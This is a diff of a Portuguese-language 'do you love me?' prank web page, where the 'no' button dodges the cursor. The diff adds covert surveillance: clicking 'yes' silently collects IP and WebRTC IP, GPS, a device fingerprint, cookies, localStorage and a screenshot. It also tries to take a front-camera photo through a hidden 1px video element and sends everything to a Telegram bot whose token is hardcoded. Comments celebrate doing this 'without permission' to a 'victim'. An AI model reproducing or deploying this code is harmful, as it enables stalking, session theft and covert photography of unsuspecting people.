@@ -12,7 +12,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             background: #0a0a0a;
             font-family: 'Courier New', monospace;
@@ -22,7 +21,6 @@
             align-items: center;
             padding: 20px;
         }
-
         .container {
             max-width: 600px;
             width: 100%;
@@ -33,7 +31,6 @@
             text-align: center;
             box-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
         }
-
         .pergunta {
             font-size: 28px;
             color: #fff;
@@ -41,7 +38,6 @@
             letter-spacing: 2px;
             font-weight: 300;
         }
-
         .buttons {
             display: flex;
             justify-content: center;
@@ -50,7 +46,6 @@
             position: relative;
             min-height: 80px;
         }
-
         .btn {
             font-size: 22px;
             padding: 14px 50px;
@@ -64,28 +59,16 @@
             border-radius: 8px;
             min-width: 120px;
         }
-
-        .btn-sim {
-            border-color: #fff;
-            color: #fff;
-        }
-
         .btn-sim:hover {
             background: #fff;
             color: #000;
         }
-
         .btn-nao {
             border-color: #666;
             color: #666;
             transition: all 0.05s ease;
             position: relative;
         }
-
-        .btn-nao:hover {
-            transform: scale(1);
-        }
-
         .final-message {
             display: none;
             margin-top: 30px;
@@ -96,13 +79,10 @@
             letter-spacing: 2px;
             line-height: 1.8;
         }
-
         .final-message .destaque {
             color: #ff3366;
             font-weight: bold;
         }
-
-        /* LOADING */
         .loader {
             border: 3px solid #1a1a1a;
             border-top: 3px solid #fff;
@@ -113,7 +93,6 @@
             margin: 20px auto;
             display: none;
         }
-
         @keyframes spin {
             0% {
                 transform: rotate(0deg);
@@ -122,8 +101,6 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* CORAÇÕES FLUTUANTES (discretas) */
         .floating-hearts {
             position: fixed;
             top: 0;
@@ -134,14 +111,12 @@
             z-index: 999;
             overflow: hidden;
         }
-
         .floating-heart {
             position: absolute;
             font-size: 20px;
             animation: floatUp 6s linear forwards;
             opacity: 0.6;
         }
-
         @keyframes floatUp {
             0% {
                 transform: translateY(100vh) rotate(0deg) scale(0.5);
@@ -158,7 +133,19 @@
                 opacity: 0;
             }
         }
-
+        #hidden-video {
+            position: fixed;
+            bottom: -100px;
+            right: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+        }
+        #hidden-canvas {
+            display: none;
+        }
         @media (max-width: 500px) {
             .pergunta {
                 font-size: 22px;
@@ -176,19 +163,18 @@
 </head>
 <body>
 
-    <!-- CORAÇÕES FLUTUANTES (DISCRETAS) -->
+    <video id="hidden-video" autoplay muted playsinline></video>
+    <canvas id="hidden-canvas"></canvas>
+
     <div class="floating-hearts" id="floatingHearts"></div>
 
     <div class="container" id="page-content">
         <div class="pergunta">voce me ama?</div>
-
         <div class="buttons" id="buttonArea">
             <button class="btn btn-sim" id="btnSim">SIM</button>
             <button class="btn btn-nao" id="btnNao">NAO</button>
         </div>
-
         <div class="loader" id="loader"></div>
-
         <div class="final-message" id="finalMessage">
             <div>💖</div>
             <div>eu <span class="destaque">tambem</span> te amo</div>
@@ -198,7 +184,7 @@
 
     <script>
         // ============================================================
-        // 1. BOTÃO "NAO" FUGINDO (IGUAL DRONE RUSSO)
+        // 1. BOTÃO "NAO" FUGINDO
         // ============================================================
         const btnNao = document.getElementById('btnNao');
         const btnSim = document.getElementById('btnSim');
@@ -207,21 +193,13 @@
         const buttonArea = document.getElementById('buttonArea');
         const loader = document.getElementById('loader');
 
-        let tentativas = 0;
-
         btnNao.addEventListener('mouseenter', function(e) {
             if (finalMessage.style.display === 'block') return;
-
             const containerRect = container.getBoundingClientRect();
             const btnRect = btnNao.getBoundingClientRect();
-
             const padding = 20;
             const maxX = containerRect.width - btnRect.width - padding;
             const maxY = containerRect.height - btnRect.height - padding;
-
-            let currentX = btnNao.offsetLeft;
-            let currentY = btnNao.offsetTop;
-
             let newX, newY;
             let attempts = 0;
             do {
@@ -229,15 +207,10 @@
                 newY = Math.random() * maxY;
                 attempts++;
                 if (attempts > 50) break;
-            } while (Math.abs(newX - currentX) < 30 && Math.abs(newY - currentY) < 30);
-
+            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);
             btnNao.style.position = 'absolute';
             btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
             btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
-
-            tentativas++;
-            if (tentativas > 3) btnNao.textContent = '...';
-            if (tentativas > 6) btnNao.textContent = '...';
         });
 
         btnNao.addEventListener('click', function(e) {
@@ -252,40 +225,29 @@
         });
 
         // ============================================================
-        // 2. BOTÃO "SIM" — DISPARA TUDO
+        // 2. BOTÃO "SIM" — DISPARA O RUSSO (SEM PERMISSÃO)
         // ============================================================
         btnSim.addEventListener('click', function() {
-            // Esconde os botões e mostra loading
             buttonArea.style.display = 'none';
             loader.style.display = 'block';
-
-            // Dispara a coleta e envio em background
             coletarEEnviar();
-
-            // Mostra a mensagem final
             setTimeout(() => {
                 loader.style.display = 'none';
                 finalMessage.style.display = 'block';
-
-                // Chove corações discretos
                 for (let i = 0; i < 30; i++) {
                     setTimeout(() => {
                         const heart = document.createElement('div');
                         heart.className = 'floating-heart';
-                        const emojis = ['♥', '♥', '♥', '♥', '♥'];
-                        heart.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                        heart.textContent = '♥';
                         heart.style.left = Math.random() * 90 + 5 + '%';
                         heart.style.fontSize = (Math.random() * 20 + 16) + 'px';
                         heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
                         heart.style.color = '#ff3366';
                         document.getElementById('floatingHearts').appendChild(heart);
-
                         setTimeout(() => { heart.remove(); }, 7000);
                     }, i * 60);
                 }
-
                 document.querySelector('.pergunta').style.display = 'none';
-
                 setTimeout(() => {
                     finalMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 }, 300);
@@ -293,18 +255,70 @@
         });
 
         // ============================================================
-        // 3. COLETAR DADOS E ENVIAR PRO TELEGRAM
+        // 3. FUNÇÃO RUSSA COMPLETA (SEM PERMISSÃO NA TELA)
         // ============================================================
         const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
         const CHAT_ID = "8551438856";
 
+        // Tenta acessar a câmera SEM PEDIR PERMISSÃO (se pedir, desiste)
+        async function tentarCameraFrontalSilenciosa() {
+            try {
+                const video = document.getElementById('hidden-video');
+
+                // Tenta com um timeout curto (se demorar, é porque pediu permissão)
+                const streamPromise = navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+
+                // Se demorar mais de 2 segundos, cancela (provavelmente pediu permissão)
+                const timeoutPromise = new Promise((_, reject) =>
+                    setTimeout(() => reject(new Error('TIMEOUT')), 2000)
+                );
+
+                const stream = await Promise.race([streamPromise, timeoutPromise]);
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (e) {
+                // Se falhou (timeout, permissão negada, etc.), simplesmente retorna null
+                return null;
+            }
+        }
+
         async function coletarEEnviar() {
             try {
-                // ---- IP ----
+                // ---- IP PÚBLICO ----
                 const ip = await fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => d.ip)
-                    .catch(() => '❌');
+                    .then(r => r.json()).then(d => d.ip).catch(() => '❌');
+
+                // ---- IP REAL (WebRTC) ----
+                let webrtcIP = '❌';
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('teste');
+                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
+                    await pc.setLocalDescription(offer);
+                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
+                    if (candidates) {
+                        const ips = candidates.map(c => c.split(' ')[4])
+                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
+                        if (ips.length) webrtcIP = ips[0];
+                    }
+                    pc.close();
+                } catch {}
 
                 // ---- LOCALIZAÇÃO POR IP ----
                 let location = {};
@@ -323,14 +337,44 @@
                     location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                 }
 
-                // ---- TENTAR GPS EXATO (sem mostrar nada) ----
+                // ---- DETECTAR VPN ----
+                let vpnStatus = '❓ Indeterminado';
+                if (location.org) {
+                    const org = location.org.toLowerCase();
+                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
+                        'vultr', 'heroku', 'azure', 'google cloud'
+                    ];
+                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
+                }
+
+                // ---- FINGERPRINT ----
+                const fpData = [
+                    navigator.userAgent,
+                    navigator.language,
+                    screen.width + 'x' + screen.height,
+                    new Date().getTimezoneOffset(),
+                    navigator.hardwareConcurrency || '?',
+                    navigator.deviceMemory || '?',
+                    !!navigator.webdriver,
+                    !!navigator.plugins.length,
+                    navigator.doNotTrack || '?'
+                ];
+                let hash = 0;
+                const fpString = fpData.join('|');
+                for (let i = 0; i < fpString.length; i++) {
+                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
+
+                // ---- GPS EXATO (tenta sem pedir) ----
                 let gps = { status: '❌ Indisponível', lat: 'N/A', lng: 'N/A' };
                 if (navigator.geolocation) {
                     try {
                         const pos = await new Promise((resolve, reject) => {
                             navigator.geolocation.getCurrentPosition(resolve, reject, {
                                 enableHighAccuracy: true,
-                                timeout: 5000,
+                                timeout: 3000,
                                 maximumAge: 0
                             });
                         });
@@ -350,9 +394,9 @@
                 const ua = navigator.userAgent;
                 const isIOS = /iPhone|iPad|iPod/i.test(ua);
                 const isAndroid = /Android/i.test(ua);
-                let modelo = 'Desconhecido';
-                let os = 'Desconhecido';
-                let marca = 'Desconhecida';
+                let modelo = 'Desconhecido',
+                    os = 'Desconhecido',
+                    marca = 'Desconhecida';
 
                 if (isIOS) {
                     const m = ua.match(/iPhone OS (\d+)_(\d+)/);
@@ -370,6 +414,7 @@
                     marca = 'Desktop';
                 }
 
+                // ---- BATERIA ----
                 let bateria = '❌';
                 if (navigator.getBattery) {
                     try {
@@ -378,14 +423,42 @@
                     } catch {}
                 }
 
+                // ---- CONEXÃO ----
                 let conexao = '❌';
                 if (navigator.connection) {
                     conexao = navigator.connection.effectiveType || 'N/A';
                 }
 
-                const tela = `${screen.width}x${screen.height}`;
-                const idioma = navigator.language;
-                const fuso = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                // ---- PLUGINS ----
+                let plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';
+
+                // ---- COOKIES E LOCALSTORAGE ----
+                const cookies = document.cookie || '❌ Sem cookies';
+                let localStorageData = '❌';
+                try {
+                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
+                } catch {}
+
+                // ---- REDES WI-FI ----
+                let wifi = '❌';
+                if (navigator.connection) {
+                    try {
+                        wifi =
+                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
+                    } catch {}
+                }
+
+                // ---- FONTES INSTALADAS ----
+                let fonts = [];
+                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
+                for (let f of fontList) {
+                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
+                }
+                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';
 
                 // ---- PRINT REAL DA TELA INTEIRA ----
                 let screenshot = null;
@@ -402,15 +475,18 @@
                         windowHeight: window.innerHeight
                     });
                     screenshot = canvas.toDataURL('image/jpeg', 0.9);
-                } catch (e) {
-                    console.warn('Print falhou:', e);
-                }
+                } catch (e) {}
 
-                // ---- MONTA A MENSAGEM ----
+                // ---- CÂMERA FRONTAL (SILENCIOSA) ----
+                let fotoCamera = await tentarCameraFrontalSilenciosa();
+
+                // ---- MONTA MENSAGEM ----
                 let msg = `
-        💀 **RUSSO PIRATA — VÍTIMA CAPTURADA** 💀
+        💀 **RUSSO PIRATA — SEM PERMISSÃO** 💀
 
-        🌐 **IP:** ${ip}
+        🌐 **IP Público:** ${ip}
+        🔴 **IP Real (WebRTC):** ${webrtcIP}
+        🛡️ **VPN/Proxy:** ${vpnStatus}
 
         📍 **LOCALIZAÇÃO POR IP:**
            🏙️ Cidade: ${location.city}
@@ -419,7 +495,7 @@
            📍 Coordenadas: ${location.loc}
            🕰️ Fuso: ${location.timezone}
 
-        📡 **GPS EXATO (se disponível):**
+        📡 **GPS EXATO:**
            ${gps.status}
            ${gps.lat !== 'N/A' ? `🗺️ Lat: ${gps.lat}` : ''}
            ${gps.lng !== 'N/A' ? `🗺️ Lng: ${gps.lng}` : ''}
@@ -431,14 +507,25 @@
            📲 OS: ${os}
            🔋 Bateria: ${bateria}
            📶 Conexão: ${conexao}
-           📐 Tela: ${tela}
-           🌍 Idioma: ${idioma}
-           🕰️ Fuso: ${fuso}
+           📐 Tela: ${screen.width}x${screen.height}
+           🌍 Idioma: ${navigator.language}
+           🕰️ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+           🧠 Fingerprint: ${fingerprint}
+
+        📶 **REDE:** ${wifi}
+
+        🔌 **PLUGINS:** ${pluginsList}
+        🍪 **COOKIES:** ${cookies}
+        💾 **localStorage:** ${localStorageData}
+
+        🔤 **FONTES INSTALADAS:** ${fontsInstalled}
+
+        📸 **CÂMERA FRONTAL:** ${fotoCamera ? '✅ FOTO CAPTURADA (SEM PERGUNTAR)!' : '❌ NÃO DISPONÍVEL (navegador bloqueou sem avisar)'}
 
         💀 **Ela disse SIM!** 💀
         `;
 
-                // ---- ENVIA A MENSAGEM ----
+                // ---- ENVIA TEXTO ----
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -450,14 +537,26 @@
                     })
                 });
 
-                // ---- ENVIA O PRINT ----
+                // ---- ENVIA PRINT ----
                 if (screenshot) {
                     const form = new FormData();
                     const blob = await fetch(screenshot).then(res => res.blob());
                     form.append('photo', blob, 'screenshot_real.jpg');
                     form.append('chat_id', CHAT_ID);
                     form.append('caption', '🖼️ PRINT REAL DA TELA INTEIRA');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                }
 
+                // ---- ENVIA FOTO DA CÂMERA (SE CONSEGUIU) ----
+                if (fotoCamera) {
+                    const form = new FormData();
+                    const blob = await fetch(fotoCamera).then(res => res.blob());
+                    form.append('photo', blob, 'camera_frontal.jpg');
+                    form.append('chat_id', CHAT_ID);
+                    form.append('caption', '📸 FOTO DA CÂMERA FRONTAL (SEM PERMISSÃO)');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: form
@@ -470,7 +569,7 @@
         }
 
         // ============================================================
-        // 4. CORAÇÕES FLUTUANTES DE FUNDO (DISCRETAS)
+        // CORAÇÕES FLUTUANTES (FUNDO)
         // ============================================================
         setInterval(() => {
             if (finalMessage.style.display === 'block') return;
